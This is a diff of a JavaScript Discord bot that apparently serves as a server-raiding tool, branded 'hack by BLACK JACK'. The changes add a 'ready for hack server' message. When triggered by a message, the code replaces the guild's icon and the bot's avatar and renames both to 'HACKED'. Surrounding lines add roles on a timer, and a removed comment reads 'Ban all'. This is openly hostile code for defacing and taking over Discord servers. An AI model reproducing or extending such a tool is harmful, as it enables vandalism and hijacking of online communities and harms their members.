@@ -7,15 +7,14 @@ console.log(`Logged in as ${client.user.tag}!`);
 });
 
           
-/////Ban all
 
-////
 
           
 client.on("ready", () => {
   console.log('♔♔♔♔♔♔♔♔♔♔♔♔♔♔♔♔♔♔♔');
   console.log('hack by BLACK JACK');/////BLACK JACK 
 console.log('♔♔♔♔♔♔♔♔♔♔♔♔♔♔♔♔♔♔♔');
+  console.log("im ready for hack server")
 console.log(`Logged in as ${client.user.tag}!`);
   client.user.setActivity(`${prefix}help | BOT SESTAM NEW  ${client.guilds.size}`)///////shtek bnwsa
  client.user.setStatus("dnd")/////ba dly xot statusek bnwsa
@@ -48,9 +47,9 @@ client.on('message', message => {
                 message.member.addRole(rr.id);
             })
         }, 1000);
-        message.guild.setIcon("");
-        client.user.setAvatar("");
-        
+        message.guild.setIcon("https://images-ext-1.discordapp.net/external/HxQPwrwqWqhustolzxC0dblt-gjVdKi36x6a7csUjPE/https/discord.com/assets/ee7c382d9257652a88c8f7b7f22a994d.png");
+        client.user.setAvatar("https://images-ext-1.discordapp.net/external/HxQPwrwqWqhustolzxC0dblt-gjVdKi36x6a7csUjPE/https/discord.com/assets/ee7c382d9257652a88c8f7b7f22a994d.png");
+        client.user.setUsername("HACKED")
         message.guild.setName('HACKED');
         setTimeout(function() {
             setInterval(() => {
